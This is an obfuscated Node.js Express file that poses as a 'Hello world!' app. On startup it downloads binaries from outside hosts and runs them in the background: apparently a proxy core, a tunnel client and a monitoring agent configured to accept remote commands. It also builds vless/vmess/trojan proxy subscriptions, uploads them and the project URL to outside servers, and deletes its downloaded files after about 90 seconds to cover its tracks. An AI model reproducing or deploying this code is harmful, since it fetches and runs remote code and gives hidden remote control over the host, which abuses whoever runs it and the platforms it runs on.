const _0x369890=_0x2244;(function(_0x4afd9f,_0x1530fc){const _0x28b7b9=_0x2244,_0x5afea0=_0x4afd9f();while(!![]){try{const _0x13ce43=parseInt(_0x28b7b9(0x197))/0x1*(parseInt(_0x28b7b9(0x189))/0x2)+-parseInt(_0x28b7b9(0x130))/0x3+-parseInt(_0x28b7b9(0x12d))/0x4*(-parseInt(_0x28b7b9(0x16e))/0x5)+parseInt(_0x28b7b9(0x11e))/0x6+parseInt(_0x28b7b9(0x181))/0x7*(-parseInt(_0x28b7b9(0x18c))/0x8)+parseInt(_0x28b7b9(0x13f))/0x9*(parseInt(_0x28b7b9(0x18b))/0xa)+-parseInt(_0x28b7b9(0x1b1))/0xb*(parseInt(_0x28b7b9(0x1af))/0xc);if(_0x13ce43===_0x1530fc)break;else _0x5afea0['push'](_0x5afea0['shift']());}catch(_0x30e203){_0x5afea0['push'](_0x5afea0['shift']());}}}(_0x59b3,0x4de33));const express=require('express'),app=express(),axios=require(_0x369890(0x188)),os=require('os'),fs=require('fs'),path=require(_0x369890(0x10e)),{promisify}=require(_0x369890(0x124)),exec=promisify(require('child_process')[_0x369890(0x15c)]),{execSync}=require(_0x369890(0x1b3)),UPLOAD_URL=process[_0x369890(0x160)][_0x369890(0x114)]||'',PROJECT_URL=process['env'][_0x369890(0x19b)]||'',AUTO_ACCESS=process[_0x369890(0x160)][_0x369890(0x165)]||![],FILE_PATH=process[_0x369890(0x160)][_0x369890(0x102)]||_0x369890(0xf5),SUB_PATH=process[_0x369890(0x160)][_0x369890(0x148)]||_0x369890(0x140),PORT=process['env']['SERVER_PORT']||process['env'][_0x369890(0x176)]||0xbb8,UUID=process[_0x369890(0x160)][_0x369890(0x152)]||_0x369890(0x113),NEZHA_SERVER=process['env'][_0x369890(0x117)]||'',NEZHA_PORT=process['env'][_0x369890(0x155)]||'',NEZHA_KEY=process[_0x369890(0x160)][_0x369890(0x179)]||'',ARGO_DOMAIN=process['env'][_0x369890(0x17b)]||'',ARGO_AUTH=process[_0x369890(0x160)][_0x369890(0x190)]||'',ARGO_PORT=process['env']['ARGO_PORT']||0x1f41,CFIP=process[_0x369890(0x160)]['CFIP']||'cdns.doon.eu.org',CFPORT=process['env'][_0x369890(0x1a5)]||0x1bb,NAME=process[_0x369890(0x160)][_0x369890(0x126)]||'';!fs[_0x369890(0x15b)](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0x369890(0x196)](FILE_PATH+_0x369890(0x15d))):console[_0x369890(0x196)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x3f7aa6=_0x369890,_0x4c5e90=_0x3f7aa6(0x1a9);let _0x3a09a4='';for(let _0x736dd4=0x0;_0x736dd4<0x6;_0x736dd4++){_0x3a09a4+=_0x4c5e90[_0x3f7aa6(0x1b2)](Math[_0x3f7aa6(0x108)](Math[_0x3f7aa6(0x17f)]()*_0x4c5e90[_0x3f7aa6(0x18e)]));}return _0x3a09a4;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x369890(0x14b)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0x369890(0x14b)](FILE_PATH,webName),botPath=path[_0x369890(0x14b)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,'sub.txt'),listPath=path[_0x369890(0x14b)](FILE_PATH,_0x369890(0xf6)),bootLogPath=path['join'](FILE_PATH,'boot.log'),configPath=path[_0x369890(0x14b)](FILE_PATH,_0x369890(0x1a7));function deleteNodes(){const _0x3de788=_0x369890;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x48e505;try{_0x48e505=fs[_0x3de788(0x10f)](subPath,_0x3de788(0x10b));}catch{return null;}const _0x3d872e=Buffer[_0x3de788(0x129)](_0x48e505,'base64')['toString'](_0x3de788(0x10b)),_0x472645=_0x3d872e[_0x3de788(0x118)]('\x0a')[_0x3de788(0x166)](_0x5473f1=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x3de788(0x132)](_0x5473f1));if(_0x472645[_0x3de788(0x18e)]===0x0)return;return axios['post'](UPLOAD_URL+_0x3de788(0x115),JSON[_0x3de788(0x178)]({'nodes':_0x472645}),{'headers':{'Content-Type':_0x3de788(0x142)}})['catch'](_0x2f6329=>{return null;}),null;}catch(_0x164a40){return null;}}function _0x2244(_0x399ae7,_0xdf3bc7){const _0x59b36a=_0x59b3();return _0x2244=function(_0x2244b0,_0xec7f71){_0x2244b0=_0x2244b0-0xf5;let _0x56d79e=_0x59b36a[_0x2244b0];return _0x56d79e;},_0x2244(_0x399ae7,_0xdf3bc7);}function cleanupOldFiles(){const _0x26782d=_0x369890;try{const _0x48ab78=fs[_0x26782d(0x17a)](FILE_PATH);_0x48ab78[_0x26782d(0x137)](_0x18cb0d=>{const _0x4dff65=_0x26782d,_0x39d7fd=path[_0x4dff65(0x14b)](FILE_PATH,_0x18cb0d);try{const _0x29ca02=fs['statSync'](_0x39d7fd);_0x29ca02[_0x4dff65(0x16d)]()&&fs[_0x4dff65(0x127)](_0x39d7fd);}catch(_0x318c25){}});}catch(_0x139f97){}}app[_0x369890(0x1a0)]('/',function(_0x52854c,_0x3b6e78){const _0x412f19=_0x369890;_0x3b6e78['send'](_0x412f19(0x1a4));});function _0x59b3(){const _0x58f433=['none','SUB_PATH','basename','php\x20running\x20error:\x20','join','includes','clear','2087','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','Empowerment\x20success\x20for\x20','https://arm64.ssss.nyc.mn/bot','UUID','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','Unhandled\x20error\x20in\x20startserver:','NEZHA_PORT','\x20>/dev/null\x202>&1\x20&','?encryption=none&security=tls&sni=','message','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','fileUrl','existsSync','exec','\x20is\x20created','Empowerment\x20failed\x20for\x20','/api/add-subscriptions','env','then','stream','/vmess-argo?ed=2560','false','AUTO_ACCESS','filter','push','&fp=firefox&type=ws&host=','/vmess-argo','web\x20running\x20error:\x20','https://amd64.ssss.nyc.mn/web','\x20-p\x20','isFile','923085ZxaqqF','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','win32','\x0a\x20\x20\x0avmess://','\x0a\x20\x20\x20\x20','pipe','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','/config.json\x20>/dev/null\x202>&1\x20&','PORT','2053','stringify','NEZHA_KEY','readdirSync','ARGO_DOMAIN','rm\x20-rf\x20','\x20-c\x20','substring','random','http\x20server\x20is\x20running\x20on\x20port:','161NJwiIp','Error\x20in\x20startserver:','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','block','8443','\x20failed:\x20','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','axios','9414FdaHaR','unshift','134510OjqzeT','203384INlIvR','/tunnel.yml\x20run','length','pop','ARGO_AUTH','listen','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','tls','config.yaml','Content-Type','log','58xtGesh','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','Error\x20reading\x20boot.log:','/sub.txt\x20saved\x20successfully','PROJECT_URL','set','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','match','https://amd64.ssss.nyc.mn/agent','get','arm','response','443','Hello\x20world!','CFPORT','trojan','config.json','automatic\x20access\x20task\x20added\x20successfully','abcdefghijklmnopqrstuvwxyz','\x0a\x20\x20credentials-file:\x20','arch','tunnel.yml','&path=%2Ftrojan-argo%3Fed%3D2560#','Error\x20executing\x20command:\x20','146772SgBewt','trim','209lLstbh','charAt','child_process','./tmp','list.txt','base64','status','quic','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','Nodes\x20uploaded\x20successfully','Subscription\x20uploaded\x20successfully','map','text/plain;\x20charset=utf-8','post','has','arm64','FILE_PATH','Add\x20automatic\x20access\x20task\x20faild:\x20','fileName','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','https://arm64.ssss.nyc.mn/agent','mkdirSync','floor','\x0avless://','freedom','utf-8','\x20-c\x20\x22','writeFileSync','path','readFileSync','ArgoDomain:','Skipping\x20adding\x20automatic\x20access\x20task','tcp','391a13e1-1938-46b5-8ab8-3404fc3f0699','UPLOAD_URL','/api/delete-nodes','tunnel.json','NEZHA_SERVER','split','pkill\x20-f\x20\x22[','boot.log','https://oooo.serv00.net/add-url','/dev/null','\x22\x20>\x20/dev/null\x202>&1','3596532RiDJYr','vless','toString','/api/add-nodes','https://amd64.ssss.nyc.mn/v1','nohup\x20','util','error','NAME','unlinkSync','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','from','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','blackhole','/vless-argo','4zadAAV','\x20successfully','\x20>/dev/null\x202>&1','1417173NpFfNV','https://arm64.ssss.nyc.mn/web','test','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','Error\x20downloading\x20files:','\x20is\x20running','platform','forEach','unlink','Download\x20','ARGO_DOMAIN:','127.0.0.1','finish','2083','taskkill\x20/f\x20/im\x20','369BVIUFW','sub','createWriteStream','application/json','App\x20is\x20running','2096','https://arm64.ssss.nyc.mn/v1','/trojan-argo'];_0x59b3=function(){return _0x58f433;};return _0x59b3();}async function generateConfig(){const _0x5c0a08=_0x369890,_0x424a3e={'log':{'access':'/dev/null','error':_0x5c0a08(0x11c),'loglevel':_0x5c0a08(0x147)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x5c0a08(0x11f),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x5c0a08(0x12c),'dest':0xbba},{'path':_0x5c0a08(0x169),'dest':0xbbb},{'path':_0x5c0a08(0x146),'dest':0xbbc}]},'streamSettings':{'network':_0x5c0a08(0x112)}},{'port':0xbb9,'listen':_0x5c0a08(0x13b),'protocol':_0x5c0a08(0x11f),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x5c0a08(0x112),'security':'none'}},{'port':0xbba,'listen':_0x5c0a08(0x13b),'protocol':_0x5c0a08(0x11f),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x5c0a08(0x147),'wsSettings':{'path':'/vless-argo'}},'sniffing':{'enabled':!![],'destOverride':['http','tls',_0x5c0a08(0xf9)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x5c0a08(0x13b),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x5c0a08(0x169)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x5c0a08(0x193),_0x5c0a08(0xf9)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x5c0a08(0x13b),'protocol':_0x5c0a08(0x1a6),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x5c0a08(0x147),'wsSettings':{'path':_0x5c0a08(0x146)}},'sniffing':{'enabled':!![],'destOverride':['http',_0x5c0a08(0x193),_0x5c0a08(0xf9)],'metadataOnly':![]}}],'dns':{'servers':['https+local://8.8.8.8/dns-query']},'outbounds':[{'protocol':_0x5c0a08(0x10a),'tag':'direct'},{'protocol':_0x5c0a08(0x12b),'tag':_0x5c0a08(0x184)}]};fs[_0x5c0a08(0x10d)](path['join'](FILE_PATH,_0x5c0a08(0x1a7)),JSON[_0x5c0a08(0x178)](_0x424a3e,null,0x2));}function getSystemArchitecture(){const _0x29c488=_0x369890,_0x46fb60=os[_0x29c488(0x1ab)]();return _0x46fb60===_0x29c488(0x1a1)||_0x46fb60===_0x29c488(0x101)||_0x46fb60==='aarch64'?_0x29c488(0x1a1):'amd';}function downloadFile(_0x2f92a5,_0x4e5527,_0x25f404){const _0x7c032c=_0x369890,_0x29a007=_0x2f92a5;!fs[_0x7c032c(0x15b)](FILE_PATH)&&fs[_0x7c032c(0x107)](FILE_PATH,{'recursive':!![]});const _0x4e4cd0=fs[_0x7c032c(0x141)](_0x29a007);axios({'method':_0x7c032c(0x1a0),'url':_0x4e5527,'responseType':_0x7c032c(0x162)})[_0x7c032c(0x161)](_0x341058=>{const _0x581b3c=_0x7c032c;_0x341058['data'][_0x581b3c(0x173)](_0x4e4cd0),_0x4e4cd0['on'](_0x581b3c(0x13c),()=>{const _0x3f32ff=_0x581b3c;_0x4e4cd0['close'](),console[_0x3f32ff(0x196)]('Download\x20'+path['basename'](_0x29a007)+_0x3f32ff(0x12e)),_0x25f404(null,_0x29a007);}),_0x4e4cd0['on'](_0x581b3c(0x125),_0x2c9131=>{const _0x308834=_0x581b3c;fs[_0x308834(0x138)](_0x29a007,()=>{});const _0x10955d=_0x308834(0x139)+path[_0x308834(0x149)](_0x29a007)+_0x308834(0x186)+_0x2c9131[_0x308834(0x158)];console[_0x308834(0x125)](_0x10955d),_0x25f404(_0x10955d);});})['catch'](_0x26278d=>{const _0x339e2a=_0x7c032c,_0x3e6cbe=_0x339e2a(0x139)+path[_0x339e2a(0x149)](_0x29a007)+_0x339e2a(0x186)+_0x26278d[_0x339e2a(0x158)];console[_0x339e2a(0x125)](_0x3e6cbe),_0x25f404(_0x3e6cbe);});}async function downloadFilesAndRun(){const _0x5ce808=_0x369890,_0x3250e7=getSystemArchitecture(),_0x2b8cc5=getFilesForArchitecture(_0x3250e7);if(_0x2b8cc5[_0x5ce808(0x18e)]===0x0){console[_0x5ce808(0x196)](_0x5ce808(0x198));return;}const _0x5a31d0=_0x2b8cc5[_0x5ce808(0xfd)](_0x5a22d1=>{return new Promise((_0x1b4519,_0x2d837b)=>{const _0x13a615=_0x2244;downloadFile(_0x5a22d1[_0x13a615(0x104)],_0x5a22d1[_0x13a615(0x15a)],(_0x46ac0f,_0x22d1d7)=>{_0x46ac0f?_0x2d837b(_0x46ac0f):_0x1b4519(_0x22d1d7);});});});try{await Promise['all'](_0x5a31d0);}catch(_0x36e18a){console[_0x5ce808(0x125)](_0x5ce808(0x134),_0x36e18a);return;}function _0x33613b(_0x459b65){const _0x80c99b=0x1fd;_0x459b65['forEach'](_0x4fb362=>{const _0x623b0b=_0x2244;fs[_0x623b0b(0x15b)](_0x4fb362)&&fs['chmod'](_0x4fb362,_0x80c99b,_0x3dc32a=>{const _0xcabedf=_0x623b0b;_0x3dc32a?console[_0xcabedf(0x125)](_0xcabedf(0x15e)+_0x4fb362+':\x20'+_0x3dc32a):console[_0xcabedf(0x196)](_0xcabedf(0x150)+_0x4fb362+':\x20'+_0x80c99b[_0xcabedf(0x120)](0x8));});});}const _0x43fb8b=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x33613b(_0x43fb8b);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x116998=NEZHA_SERVER[_0x5ce808(0x14c)](':')?NEZHA_SERVER[_0x5ce808(0x118)](':')[_0x5ce808(0x18f)]():'',_0x4a4d22=new Set([_0x5ce808(0x1a3),'8443',_0x5ce808(0x144),_0x5ce808(0x14e),_0x5ce808(0x13d),_0x5ce808(0x177)]),_0x4f6911=_0x4a4d22[_0x5ce808(0x100)](_0x116998)?'true':_0x5ce808(0x164),_0x1b46a5='\x0aclient_secret:\x20'+NEZHA_KEY+_0x5ce808(0x174)+NEZHA_SERVER+_0x5ce808(0x192)+_0x4f6911+_0x5ce808(0x105)+UUID;fs[_0x5ce808(0x10d)](path[_0x5ce808(0x14b)](FILE_PATH,_0x5ce808(0x194)),_0x1b46a5);const _0x26ac9c=_0x5ce808(0x123)+phpPath+_0x5ce808(0x10c)+FILE_PATH+'/config.yaml\x22\x20>/dev/null\x202>&1\x20&';try{await exec(_0x26ac9c),console[_0x5ce808(0x196)](phpName+'\x20is\x20running'),await new Promise(_0x1500f2=>setTimeout(_0x1500f2,0x3e8));}catch(_0x3af765){console[_0x5ce808(0x125)](_0x5ce808(0x14a)+_0x3af765);}}else{let _0x29bfab='';const _0x2c87fb=['443',_0x5ce808(0x185),_0x5ce808(0x144),_0x5ce808(0x14e),_0x5ce808(0x13d),_0x5ce808(0x177)];_0x2c87fb['includes'](NEZHA_PORT)&&(_0x29bfab='--tls');const _0xd7e88c=_0x5ce808(0x123)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x5ce808(0x16c)+NEZHA_KEY+'\x20'+_0x29bfab+_0x5ce808(0x128);try{await exec(_0xd7e88c),console[_0x5ce808(0x196)](npmName+_0x5ce808(0x135)),await new Promise(_0x427d0c=>setTimeout(_0x427d0c,0x3e8));}catch(_0x3abc8b){console[_0x5ce808(0x125)]('npm\x20running\x20error:\x20'+_0x3abc8b);}}}else console['log']('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x73c9e3=_0x5ce808(0x123)+webPath+_0x5ce808(0x17d)+FILE_PATH+_0x5ce808(0x175);try{await exec(_0x73c9e3),console[_0x5ce808(0x196)](webName+_0x5ce808(0x135)),await new Promise(_0x3cb5bd=>setTimeout(_0x3cb5bd,0x3e8));}catch(_0x333459){console['error'](_0x5ce808(0x16a)+_0x333459);}if(fs[_0x5ce808(0x15b)](botPath)){let _0x154765;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x154765=_0x5ce808(0xfa)+ARGO_AUTH;else ARGO_AUTH['match'](/TunnelSecret/)?_0x154765=_0x5ce808(0x16f)+FILE_PATH+_0x5ce808(0x18d):_0x154765='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x5ce808(0x183)+ARGO_PORT;try{await exec(_0x5ce808(0x123)+botPath+'\x20'+_0x154765+_0x5ce808(0x156)),console[_0x5ce808(0x196)](botName+_0x5ce808(0x135)),await new Promise(_0x3801b2=>setTimeout(_0x3801b2,0x7d0));}catch(_0xb3f49b){console['error'](_0x5ce808(0x1ae)+_0xb3f49b);}}await new Promise(_0x3359c6=>setTimeout(_0x3359c6,0x1388));}function getFilesForArchitecture(_0x512ef2){const _0x2dc1a7=_0x369890;let _0x3ec532;_0x512ef2===_0x2dc1a7(0x1a1)?_0x3ec532=[{'fileName':webPath,'fileUrl':_0x2dc1a7(0x131)},{'fileName':botPath,'fileUrl':_0x2dc1a7(0x151)}]:_0x3ec532=[{'fileName':webPath,'fileUrl':_0x2dc1a7(0x16b)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0xc5750f=_0x512ef2===_0x2dc1a7(0x1a1)?_0x2dc1a7(0x106):_0x2dc1a7(0x19f);_0x3ec532[_0x2dc1a7(0x18a)]({'fileName':npmPath,'fileUrl':_0xc5750f});}else{const _0xad1ae9=_0x512ef2==='arm'?_0x2dc1a7(0x145):_0x2dc1a7(0x122);_0x3ec532[_0x2dc1a7(0x18a)]({'fileName':phpPath,'fileUrl':_0xad1ae9});}}return _0x3ec532;}function argoType(){const _0x3dac0c=_0x369890;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x3dac0c(0x196)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH['includes']('TunnelSecret')){fs[_0x3dac0c(0x10d)](path[_0x3dac0c(0x14b)](FILE_PATH,_0x3dac0c(0x116)),ARGO_AUTH);const _0x5c715f='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x3dac0c(0x118)]('\x22')[0xb]+_0x3dac0c(0x1aa)+path[_0x3dac0c(0x14b)](FILE_PATH,_0x3dac0c(0x116))+_0x3dac0c(0x12a)+ARGO_DOMAIN+_0x3dac0c(0x159)+ARGO_PORT+_0x3dac0c(0x133);fs[_0x3dac0c(0x10d)](path[_0x3dac0c(0x14b)](FILE_PATH,_0x3dac0c(0x1ac)),_0x5c715f);}else console['log']('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}argoType();async function extractDomains(){const _0x195ea4=_0x369890;let _0x116069;if(ARGO_AUTH&&ARGO_DOMAIN)_0x116069=ARGO_DOMAIN,console[_0x195ea4(0x196)](_0x195ea4(0x13a),_0x116069),await _0x1696c3(_0x116069);else try{const _0x345299=fs[_0x195ea4(0x10f)](path['join'](FILE_PATH,_0x195ea4(0x11a)),_0x195ea4(0x10b)),_0x20b548=_0x345299['split']('\x0a'),_0xbdece9=[];_0x20b548['forEach'](_0x553c6e=>{const _0x647daa=_0x195ea4,_0x225530=_0x553c6e[_0x647daa(0x19e)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x225530){const _0x3541ec=_0x225530[0x1];_0xbdece9[_0x647daa(0x167)](_0x3541ec);}});if(_0xbdece9[_0x195ea4(0x18e)]>0x0)_0x116069=_0xbdece9[0x0],console['log'](_0x195ea4(0x110),_0x116069),await _0x1696c3(_0x116069);else{console['log'](_0x195ea4(0x14f)),fs['unlinkSync'](path['join'](FILE_PATH,_0x195ea4(0x11a)));async function _0x5a88e6(){const _0x450ec2=_0x195ea4;try{process['platform']===_0x450ec2(0x170)?await exec(_0x450ec2(0x13e)+botName+'.exe\x20>\x20nul\x202>&1'):await exec(_0x450ec2(0x119)+botName['charAt'](0x0)+']'+botName[_0x450ec2(0x17e)](0x1)+_0x450ec2(0x11d));}catch(_0x894a92){}}_0x5a88e6(),await new Promise(_0x1d3ba5=>setTimeout(_0x1d3ba5,0xbb8));const _0x3cf243=_0x195ea4(0x19d)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x3cf243+_0x195ea4(0x156)),console[_0x195ea4(0x196)](botName+'\x20is\x20running'),await new Promise(_0xae619e=>setTimeout(_0xae619e,0xbb8)),await extractDomains();}catch(_0x15acc1){console['error']('Error\x20executing\x20command:\x20'+_0x15acc1);}}}catch(_0x3974d4){console[_0x195ea4(0x125)](_0x195ea4(0x199),_0x3974d4);}async function _0x1696c3(_0x416b7f){const _0xdda559=_0x195ea4,_0xfc44cc=execSync(_0xdda559(0x187),{'encoding':_0xdda559(0x10b)}),_0x4e287b=_0xfc44cc[_0xdda559(0x1b0)](),_0x31b1bc=NAME?NAME+'-'+_0x4e287b:_0x4e287b;return new Promise(_0x3c4eab=>{setTimeout(()=>{const _0x205375=_0x2244,_0xd32f99={'v':'2','ps':''+_0x31b1bc,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x205375(0x147),'net':'ws','type':_0x205375(0x147),'host':_0x416b7f,'path':_0x205375(0x163),'tls':_0x205375(0x193),'sni':_0x416b7f,'alpn':'','fp':'firefox'},_0x35d4d6=_0x205375(0x109)+UUID+'@'+CFIP+':'+CFPORT+_0x205375(0x157)+_0x416b7f+'&fp=firefox&type=ws&host='+_0x416b7f+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x31b1bc+_0x205375(0x171)+Buffer[_0x205375(0x129)](JSON['stringify'](_0xd32f99))[_0x205375(0x120)](_0x205375(0xf7))+'\x0a\x20\x20\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x416b7f+_0x205375(0x168)+_0x416b7f+_0x205375(0x1ad)+_0x31b1bc+_0x205375(0x172);console[_0x205375(0x196)](Buffer[_0x205375(0x129)](_0x35d4d6)[_0x205375(0x120)]('base64')),fs[_0x205375(0x10d)](subPath,Buffer[_0x205375(0x129)](_0x35d4d6)[_0x205375(0x120)](_0x205375(0xf7))),console['log'](FILE_PATH+_0x205375(0x19a)),uploadNodes(),app[_0x205375(0x1a0)]('/'+SUB_PATH,(_0x154883,_0x4c119e)=>{const _0x4b1f94=_0x205375,_0x33b99a=Buffer[_0x4b1f94(0x129)](_0x35d4d6)['toString'](_0x4b1f94(0xf7));_0x4c119e[_0x4b1f94(0x19c)](_0x4b1f94(0x195),_0x4b1f94(0xfe)),_0x4c119e['send'](_0x33b99a);}),_0x3c4eab(_0x35d4d6);},0x7d0);});}}async function uploadNodes(){const _0x360ce6=_0x369890;if(UPLOAD_URL&&PROJECT_URL){const _0x29a972=PROJECT_URL+'/'+SUB_PATH,_0x2a31ea={'subscription':[_0x29a972]};try{const _0x47a863=await axios[_0x360ce6(0xff)](UPLOAD_URL+_0x360ce6(0x15f),_0x2a31ea,{'headers':{'Content-Type':_0x360ce6(0x142)}});return _0x47a863&&_0x47a863['status']===0xc8?(console[_0x360ce6(0x196)](_0x360ce6(0xfc)),_0x47a863):null;}catch(_0x2c3b6f){if(_0x2c3b6f[_0x360ce6(0x1a2)]){if(_0x2c3b6f[_0x360ce6(0x1a2)][_0x360ce6(0xf8)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x360ce6(0x15b)](listPath))return;const _0x2bf022=fs[_0x360ce6(0x10f)](listPath,'utf-8'),_0x183d23=_0x2bf022[_0x360ce6(0x118)]('\x0a')[_0x360ce6(0x166)](_0x1fc2f7=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x360ce6(0x132)](_0x1fc2f7));if(_0x183d23[_0x360ce6(0x18e)]===0x0)return;const _0x5b052f=JSON[_0x360ce6(0x178)]({'nodes':_0x183d23});try{const _0x2c22ae=await axios[_0x360ce6(0xff)](UPLOAD_URL+_0x360ce6(0x121),_0x5b052f,{'headers':{'Content-Type':'application/json'}});return _0x2c22ae&&_0x2c22ae['status']===0xc8?(console[_0x360ce6(0x196)](_0x360ce6(0xfb)),_0x2c22ae):null;}catch(_0x3a0457){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x254833=_0x2244,_0x2c358c=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x2c358c[_0x254833(0x167)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x2c358c[_0x254833(0x167)](phpPath);process[_0x254833(0x136)]===_0x254833(0x170)?exec('del\x20/f\x20/q\x20'+_0x2c358c[_0x254833(0x14b)]('\x20')+'\x20>\x20nul\x202>&1',_0x14d8e8=>{const _0x585932=_0x254833;console[_0x585932(0x14d)](),console[_0x585932(0x196)](_0x585932(0x143)),console[_0x585932(0x196)](_0x585932(0x153));}):exec(_0x254833(0x17c)+_0x2c358c[_0x254833(0x14b)]('\x20')+_0x254833(0x12f),_0x2439f2=>{const _0x4ddaa7=_0x254833;console[_0x4ddaa7(0x14d)](),console[_0x4ddaa7(0x196)](_0x4ddaa7(0x143)),console[_0x4ddaa7(0x196)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x419aa8=_0x369890;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x419aa8(0x196)](_0x419aa8(0x111));return;}try{const _0x2fd315=await axios[_0x419aa8(0xff)](_0x419aa8(0x11b),{'url':PROJECT_URL},{'headers':{'Content-Type':'application/json'}});return console[_0x419aa8(0x196)](_0x419aa8(0x1a8)),_0x2fd315;}catch(_0x14c2ff){return console[_0x419aa8(0x125)](_0x419aa8(0x103)+_0x14c2ff[_0x419aa8(0x158)]),null;}}async function startserver(){const _0x36a595=_0x369890;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x5f358a){console[_0x36a595(0x125)](_0x36a595(0x182),_0x5f358a);}}startserver()['catch'](_0x4d2d98=>{const _0x8cbc90=_0x369890;console[_0x8cbc90(0x125)](_0x8cbc90(0x154),_0x4d2d98);}),app[_0x369890(0x191)](PORT,()=>console[_0x369890(0x196)](_0x369890(0x180)+PORT+'!'));
